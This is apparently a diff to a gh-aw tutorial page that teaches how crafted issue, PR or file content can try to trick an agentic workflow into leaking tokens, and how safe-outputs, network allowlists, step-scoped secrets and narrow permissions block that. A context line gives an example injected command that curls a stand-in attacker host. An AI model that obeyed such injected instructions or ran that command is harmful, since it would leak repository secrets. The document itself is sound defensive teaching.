@@ -4,10 +4,10 @@
 
 > _Optional: work through this security primer to understand how crafted repository content can try to trick your agent into leaking tokens or API keys — and why gh-aw's design makes that very difficult._
 
-## 📋 Before You Start
+## :clipboard: Before You Start
 
-- You have a basic agentic workflow from [Build Your Daily Status Workflow](07-your-first-workflow.md) or equivalent.
-- You understand `safe-outputs` and `permissions` frontmatter from [Write Your First Agentic Workflow](07-your-first-workflow.md).
+- You have a basic [agentic workflow](https://github.github.com/gh-aw/introduction/overview/#what-are-agentic-workflows) from [Build Your Daily Status Workflow](07-your-first-workflow.md) or equivalent.
+- You understand `safe-outputs` and `permissions` [frontmatter](https://github.github.com/gh-aw/reference/frontmatter/) from [Write Your First Agentic Workflow](07-your-first-workflow.md).
 - You have started [Connect a Live Data Source to Your Workflow](16-connect-data-source.md).
 
 When your agent reads live repository content — issue bodies, PR descriptions, commit messages, file contents — it reads text written by other people. Some of that text might try to act like an instruction aimed at your secrets.
@@ -49,11 +49,11 @@ This protects values that are declared in `secrets:` — including `GITHUB_TOKEN
 
 ### `safe-outputs` removes unintended write surfaces
 
-gh-aw's [`safe-outputs`](https://github.github.com/gh-aw/reference/safe-outputs/) frontmatter key declares the exact output surfaces the agent is allowed to write to. If `create-issue` or `post-comment` are not in that list, the agent has no tool to write those outputs — and therefore no surface to exfiltrate data through those channels.
+gh-aw's [`safe-outputs`](https://github.github.com/gh-aw/reference/safe-outputs/) frontmatter key declares the exact output surfaces the agent is allowed to write to. If `create-issue` or `add-comment` are not in that list, the agent has no tool to write those outputs — and therefore no surface to exfiltrate data through those channels.
 
 Example frontmatter that keeps the workflow read-only:
 
-```yaml
+```markdown
 ---
 permissions:
   contents: read
@@ -67,7 +67,7 @@ An injection asking the agent to open an issue or post a comment will fail becau
 
 gh-aw lets you declare a [firewall](https://github.github.com/gh-aw/reference/network/) allowlist of domains the workflow runner may contact. Any outbound connection to a domain not in the list is rejected.
 
-```yaml
+```markdown
 ---
 network:
   allowed:
@@ -85,7 +85,7 @@ Even if an injected instruction tells the agent to `curl https://attacker.exampl
 
 Avoid exposing secrets as global environment variables. Instead, use the `env:` key at the step level and inject only the secret that step requires:
 
-```yaml
+```markdown
 - name: Fetch open issues
   id: issues
   run: |
@@ -101,7 +101,7 @@ With this pattern, `GITHUB_TOKEN` is only available to the shell in that one ste
 
 A narrow [permissions](https://github.github.com/gh-aw/reference/permissions/) block limits what `GITHUB_TOKEN` is authorized to do. A workflow with:
 
-```yaml
+```markdown
 ---
 permissions:
   contents: read
@@ -115,7 +115,7 @@ cannot write, delete, or push even if an attacker crafts an instruction to do so
 
 ## Layered defences at a glance
 
-> 🤔 **Predict:** Before reading the table below, list from memory as many gh-aw defences against token exfiltration as you can. Then check your list against the table.
+> :thinking: **Predict:** Before reading the table below, list from memory as many gh-aw defences against token exfiltration as you can. Then check your list against the table.
 
 | Layer | What it does |
 |---|---|
@@ -141,7 +141,7 @@ No single layer is sufficient on its own. Together they make a successful exfilt
 
 ---
 
-## ✅ Checkpoint
+## :white_check_mark: Checkpoint
 
 - [ ] You can describe how an attacker might try to exfiltrate a token through crafted issue or PR content
 - [ ] You can list three gh-aw features that prevent token exfiltration
